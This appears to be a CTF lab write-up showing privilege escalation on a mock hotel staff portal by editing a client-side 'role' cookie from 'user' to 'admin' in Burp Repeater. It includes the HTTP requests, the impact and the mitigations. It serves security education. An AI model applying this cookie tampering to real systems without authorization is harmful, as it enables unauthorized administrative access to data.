---
title: "Privilege Escalation – Client-Side Role Cookie Tampering | Session Swap"
date: 2026-05-29 00:00:00 +0530
categories: [A01 - Broken Access Control, Privilege Escalation]
tags: [webversepro, broken-access-control, privilege-escalation, cookie-tampering, authorization, session-management]
author: Shivansh Sharma
image:
  path: /assets/images/posts/session-swap-privilege-escalation.webp
  alt: Privilege Escalation – Client-Side Role Cookie Tampering | Session Swap
---

## Lab Link

Lab: [Session Swap](https://dashboard.webverselabs-pro.com/challenges/session-swap)

---

## Overview

Ridgeline Hotels recently deployed a new internal portal for front-desk staff, housekeeping leads, and management personnel.

The application attempts to enforce role-based access control using a browser cookie. Unfortunately, the role value is entirely controlled by the client and is not cryptographically protected or validated by the server.

As a result, any user can modify their role and gain access to administrative functionality.

This is a classic privilege escalation vulnerability caused by trusting client-controlled authorization data.

---

## Objective

Manipulate the application's authorization mechanism to obtain administrative privileges and retrieve the flag.

---

## Vulnerability Identification

This challenge is primarily a Privilege Escalation vulnerability.

### Classification Hierarchy

A01 - Broken Access Control
└── Authorization Failure
└── Client-Controlled Authorization
└── Privilege Escalation via Cookie Tampering

---

## Reconnaissance

Access the application:

```text
https://896252cd-4065-session-swap-9368b.challenges.webverselabs-pro.com
```

The portal allows users to authenticate using arbitrary credentials.

For example:

```text
Employee ID: test
Password: test
```

After authentication, additional functionality appears to exist for administrators.

Testing the administrative endpoint reveals:

```text
https://896252cd-4065-session-swap-9368b.challenges.webverselabs-pro.com/admin
```

Response:

```http
HTTP/1.1 403 Forbidden
```

This confirms that access control is being enforced in some manner.

---

## Exploitation

### Step 1 - Inspect the Admin Request

Intercept the request to the administrative area.

```http
GET /admin HTTP/2
Host: 896252cd-4065-session-swap-9368b.challenges.webverselabs-pro.com
Cookie: role=user; badge=RD-04412
```

The request immediately reveals something suspicious.

The authorization decision appears to rely on:

```text
role=user
```

stored directly inside a browser cookie.

---

### Step 2 - Identify Client-Controlled Authorization

The application is trusting the browser to supply authorization information.

Observed cookie:

```text
role=user
```

This suggests the server may be determining access rights directly from the cookie value rather than from a server-side session.

A secure implementation would typically:

* Store the role server-side.
* Use a signed token.
* Verify integrity before trusting role information.

None of those protections appear to be present.

---

### Step 3 - Modify the Role

Send the request to Burp Repeater.

Original cookie:

```http
Cookie: role=user; badge=RD-04412
```

Modified cookie:

```http
Cookie: role=admin; badge=RD-04412
```

Forward the request.

---

### Step 4 - Confirm Privilege Escalation

The server now treats the user as an administrator.

The previous authorization failure disappears and the administrative area becomes accessible.

This confirms that authorization decisions are based entirely on a client-controlled cookie.

---

### Step 5 - Retrieve the Flag

Review the response returned by the administrative endpoint.

The flag is present in the response body.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Original Request

```http
GET /admin HTTP/2
Cookie: role=user; badge=RD-04412
```

### Response

```http
403 Forbidden
```

### Modified Request

```http
GET /admin HTTP/2
Cookie: role=admin; badge=RD-04412
```

### Result

```text
Administrative dashboard accessible
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can:

* Escalate privileges.
* Access administrative functionality.
* Bypass role restrictions.
* Access sensitive operational data.
* Perform administrative actions.
* Potentially compromise the entire application.

In a real hotel management platform, this could expose:

* Guest records
* Reservation data
* Staff information
* Financial reports
* Internal operational systems

---

## Mitigation

### Never Trust Client-Side Authorization Data

Roles should never be enforced using user-modifiable cookies.

### Store Authorization Server-Side

User roles should be retrieved from a trusted backend datastore.

### Sign Session Tokens

Any authorization-related token should be cryptographically signed and verified.

### Validate Authorization on Every Request

Administrative routes should verify:

```text
Authenticated User
AND
Server-Side Role Verification
```

before granting access.

### Perform Authorization Testing

Security reviews should attempt to modify:

```text
role
is_admin
permissions
group
access_level
```

whenever these values appear in requests or cookies.

---

## Real-World Insight

Many privilege escalation vulnerabilities occur because developers trust data originating from the browser.

Attackers fully control:

* Cookies
* Request parameters
* Headers
* JSON bodies
* Local storage

Any authorization decision based solely on client-supplied values can often be bypassed.

The Session Swap challenge demonstrates one of the most fundamental security principles:

**The client may provide identity information, but the server must always verify authorization independently.**
